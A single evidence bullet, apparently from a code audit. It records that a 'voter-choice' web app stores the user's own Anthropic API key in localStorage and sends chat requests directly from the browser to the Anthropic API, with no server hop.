- **Evidence:** `STORAGE_KEY = "voter-choice:byok-anthropic-key"` in localStorage; `streamWithByok` POSTs directly to `https://api.anthropic.com/v1/messages` with `x-api-key` from `getByokKey()` — no server hop (`chatTransport.ts` routes BYOK straight to `streamWithByok`; the server path sends only messages+systemPrompt).
